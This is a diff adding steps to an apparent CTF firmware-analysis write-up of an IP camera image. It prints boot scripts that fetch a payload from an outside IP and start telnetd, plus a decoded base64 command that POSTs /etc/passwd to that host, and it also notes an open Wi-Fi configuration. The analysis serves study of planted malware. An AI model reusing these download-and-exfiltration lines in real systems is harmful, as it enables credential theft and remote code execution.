@@ -98,6 +98,118 @@ chakravyuh.bin: u-boot legacy uImage, hi3520Dromfs, Linux/ARM, OS Kernel Image (
 - The firmware references `hi3520Dromfs`, indicating it is based on HiSilicon's Hi3520D chip, commonly used in IP cameras.
 - This suggests that the device might be an IP camera or similar hardware.
 
+## **Step 5: Wireless Configuration**
+The file `/etc/Wireless/RT2870STA/RT2870STA.dat` contains wireless configuration details. 
+
+### **Contents of RT2870STA.dat**:
+```
+#The word of "Default" must not be removed
+Default
+CountryRegion=5
+CountryRegionABand=7
+CountryCode=
+ChannelGeography=1
+SSID=11n-AP
+NetworkType=Infra
+WirelessMode=5
+Channel=0
+BeaconPeriod=100
+TxPower=100
+BGProtection=0
+TxPreamble=0
+RTSThreshold=2347
+FragThreshold=2346
+TxBurst=1
+PktAggregate=0
+WmmCapable=1
+AckPolicy=0;0;0;0
+AuthMode=OPEN
+EncrypType=NONE
+WPAPSK=
+DefaultKeyID=1
+Key1Type=0
+Key1Str=
+Key2Type=0
+Key2Str=
+Key3Type=0
+Key3Str=
+Key4Type=0
+Key4Str=
+PSMode=CAM
+AutoRoaming=0
+RoamThreshold=70
+APSDCapable=0
+APSDAC=0;0;0;0
+```
+...
+## Step 6- The real fun begins >:)
+The path `etc/init.d/` has these bash scripts- 
+#
+    ls etc/init.d/
+S00devs  S01udev  S02wndev  S80network  S81toe  S99dh  rcS
+
+The rcS script executes all other scripts in `etc/init.d`
+### **S02wndev**
+The `S02wndev` script is interesting - 
+```
+#!/bin/bash
+
+echo "service daemon packages..."
+
+wget -O http://203.0.113.25/daemon
+
+if [ $? -eq 0 ]; then
+    echo "Download completed successfully."
+else
+    echo "Download failed."
+fi
+
+mv daemon /tmp/
+
+echo "service daemon installed successfully"
+```
+This script attempts to download a file named daemon from an external IP address (203.0.113.25) and moves it to /tmp/.
+<details>
+<summary>Going to /tmp/ path</summary>
+<br>
+```
+$ cd tmp
+$ ls
+daemon  daemon1  daemon2  wireless
+$ cat daemon
+W1sgLWYgL2V0Yy9wYXNzd2QgXV0gJiYgd2dldCAtLW1ldGhvZD1QT1NUIC0taGVhZGVyPSJDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGEiIC0tYm9keS1maWxlPS9ldGMvcGFzc3dkICJodHRwOi8vMjAzLjAuMTEzLjI1LyI
+```
+The `daemon` seems like base64, so I decoded it and got this - 
+#
+        [[ -f /etc/passwd ]] && wget --method=POST --header="Content-Type: multipart/form-data" --body-file=/etc/passwd "http://203.0.113.25/"
+</details>
+### **S80network**
+This script parses network configuration parameters from /proc/cmdline. It configures the network interface, enables Telnet (telnetd), and executes a hidden decryption script (/usr/sbin/.dec.sh) on the downloaded service daemon.
+```
+... More stuff up here
+ifconfig lo 127.0.0.1
+ifconfig eth0 up
+telnetd
+
+SERVICE_DAEMON="/tmp/daemon"
+bash "$DEC" $SERVICE_DAEMON | bash
+```
+
+### S99dh
+This script mounts multiple partitions, including JFFS2, CRAMFS, and RAMFS filesystems, and extracts sensitive files using p7zip. It also sets up PPPoE configuration files and starts network services like net3g.
+```
+mount -t jffs2 /dev/mtdblock5 /mnt/mtd -o sync
+p7zip x /usr/lib/lib.7z /var/
+p7zip x /usr/bin/Challenge.7z /var/
+chmod -R 777 /var/*
+dvrhelper /var/Challenge
+```
+
+### **Analysis**:
+- The SSID is set to `11n-AP`.
+- Authentication mode is set to `OPEN`, and encryption type is `NONE`.
+- No WPA pre-shared key (`WPAPSK`) or WEP keys are configured.
+- This lack of encryption indicates an insecure wireless setup, which could allow unauthorized access to the network.
 ---
 
 ## **Challenges Encountered**
@@ -108,6 +220,7 @@ chakravyuh.bin: u-boot legacy uImage, hi3520Dromfs, Linux/ARM, OS Kernel Image (
    - Successfully overcame this issue by using `sasquatch`, which is designed for non-standard or corrupted SquashFS filesystems.
 
 ---
+
 
 ## **Next Steps**
 1. Attempt password cracking for hashes found in `/etc/passwd` and `/etc/passwd-`.
